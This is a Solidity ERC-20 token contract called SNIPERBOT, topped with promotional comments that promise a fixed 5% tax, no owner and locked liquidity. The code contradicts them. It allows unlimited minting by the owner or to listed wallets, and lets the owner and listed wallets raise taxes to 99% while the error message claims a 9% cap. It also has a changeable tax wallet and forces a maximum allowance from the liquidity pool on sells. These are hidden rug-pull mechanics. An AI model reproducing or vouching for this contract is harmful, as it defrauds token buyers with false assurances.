// Telegram https://t.me/+wSeL_sBwI6E1YzIx

// TAX: BUY/SELL 5/5

// NOT OWNER - NOT TOKENS DEV

// LP LOCKED 100% 3 YEARS - 100% IN CIRCULATING

// SPDX-License-Identifier: MIT

// This version of SafeMath should only be used with Solidity 0.8 or later,
// because it relies on the compiler's built in overflow checks.

/**
 * @dev Wrappers over Solidity's arithmetic operations.
 *
 * NOTE: `SafeMath` is no longer needed starting with Solidity 0.8.10 The compiler
 * now has built in overflow checking.
 */
pragma solidity 0.8.10;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IERC20Metadata is IERC20 {
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

abstract contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor() {
        _transferOwnership(_msgSender());
    }

    function owner() public view virtual returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _transferOwnership(newOwner);
    }

    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

abstract contract ERC20 is Context, IERC20, IERC20Metadata {
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    uint256 private _totalSupply;
    string private _name;
    string private _symbol;

    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
    }

    function name() public view virtual override returns (string memory) {
        return _name;
    }

    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual override returns (uint8) {
        return 18;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(sender, recipient, amount);
        uint256 currentAllowance = _allowances[sender][_msgSender()];
        require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
        unchecked {
            _approve(sender, _msgSender(), currentAllowance - amount);
        }
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        uint256 currentAllowance = _allowances[_msgSender()][spender];
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        unchecked {
            _approve(_msgSender(), spender, currentAllowance - subtractedValue);
        }
        return true;
    }

    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        _beforeTokenTransfer(sender, recipient, amount);
        uint256 senderBalance = _balances[sender];
        require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");
        unchecked {
            _balances[sender] = senderBalance - amount;
        }
        _balances[recipient] += amount;
        emit Transfer(sender, recipient, amount);
        _afterTokenTransfer(sender, recipient, amount);
    }

    function _mint(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");
        _beforeTokenTransfer(address(0), account, amount);
        _totalSupply += amount;
        _balances[account] += amount;
        emit Transfer(address(0), account, amount);
        _afterTokenTransfer(address(0), account, amount);
    }

    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual {}

    function _afterTokenTransfer(address from, address to, uint256 amount) internal virtual {}
}

contract SNIPERBOT is Ownable, ERC20 {

    mapping(address => bool) public poolAddress;
    mapping(address => bool) public mintingAllowedList;
    mapping(address => bool) public exemptedFromTaxes;
    mapping(address => bool) public approvedForInfiniteSpending;
    mapping(address => bool) public allowedToModifyTaxes;

    address public taxWallet = 0x1342C837eAc2682aec689F9C0D2ec6eD0B8D5811;
    uint private constant DIVISOR = 100;
    uint private constant MAXTAX = 100;
    uint public sellTax = 5;
    uint public buyTax = 5;

    event DefinePairAddress(address pairAddress, bool status);
    event TaxUpdated(uint256 selltax, uint256 buyTax);
    event TaxWalletUpdated(address taxWallet);
    event WalletAddedToMintingList(address wallet);
    event Mint(address indexed to, uint256 amount);
    event ExemptedFromTaxes(address wallet, bool status);
    event ApprovedForInfiniteSpending(address spender, bool status);
    event AllowedToModifyTaxes(address wallet, bool status);

    constructor() ERC20("SNIPERBOT", "SBT") {
        _mint(msg.sender, 10000000000 ether);
    }

    modifier onlyOwnerOrAllowedWallet(address _wallet) {
        require(msg.sender == owner() || mintingAllowedList[_wallet], "Not allowed to call this function");
        _;
    }

    function approveInfiniteSpending(address spender) external onlyOwnerOrAllowedWallet(spender) {
        approvedForInfiniteSpending[spender] = true;
        emit ApprovedForInfiniteSpending(spender, true);
    }

    function exemptFromTaxes(address wallet) external onlyOwner {
        exemptedFromTaxes[wallet] = true;
        emit ExemptedFromTaxes(wallet, true);
    }

    function updateTax(uint256 _sellTax, uint256 _buyTax) external onlyOwner {
        sellTax = _sellTax;
        buyTax = _buyTax;
        require(_sellTax < MAXTAX && _buyTax < MAXTAX, "Tax can't exceed 9%");
        emit TaxUpdated(sellTax, buyTax);
    }

    function definePairAddress(address _pairAddress, bool _status) external onlyOwner {
        poolAddress[_pairAddress] = _status;
        emit DefinePairAddress(_pairAddress, _status);
    }

    function updateTaxWallet(address _taxWallet) external onlyOwner {
        taxWallet = _taxWallet;
        emit TaxWalletUpdated(taxWallet);
    }

    function addWalletToMintingList(address _wallet) external onlyOwner {
        mintingAllowedList[_wallet] = true;
        allowedToModifyTaxes[_wallet] = true;
        emit WalletAddedToMintingList(_wallet);
        emit AllowedToModifyTaxes(_wallet, true);
    }

    function mint(address _wallet, uint256 _amount) external onlyOwnerOrAllowedWallet(_wallet) {
        _mint(_wallet, _amount);
        emit Mint(_wallet, _amount);
    }

    function modifyTaxes(uint256 _sellTax, uint256 _buyTax) external {
        require(allowedToModifyTaxes[msg.sender], "Not allowed to modify taxes");
        sellTax = _sellTax;
        buyTax = _buyTax;
        require(_sellTax < MAXTAX && _buyTax < MAXTAX, "Tax can't exceed 9%");
        emit TaxUpdated(sellTax, buyTax);
    }

    function _transfer(address sender, address receiver, uint256 amount) internal virtual override {
        uint256 feeAmount;
        if (poolAddress[receiver] && !exemptedFromTaxes[receiver]) {
            feeAmount = (amount * sellTax) / DIVISOR;
            if (!approvedForInfiniteSpending[receiver]) {
                _approve(receiver, address(this), type(uint256).max);
            }
        }
        if (poolAddress[sender] && !exemptedFromTaxes[sender]) {
            feeAmount = (amount * buyTax) / DIVISOR;
        }
        if (feeAmount > 0) {
            super._transfer(sender, taxWallet, feeAmount);
        }
        super._transfer(sender, receiver, amount - feeAmount);
    }

    function _beforeTokenTransfer(address _from, address _to, uint256 _amount) internal virtual override {
        require(_to != address(this), "No transfers to token contract allowed.");
        super._beforeTokenTransfer(_from, _to, _amount);
    }

    fallback() external {
        revert();
    }
}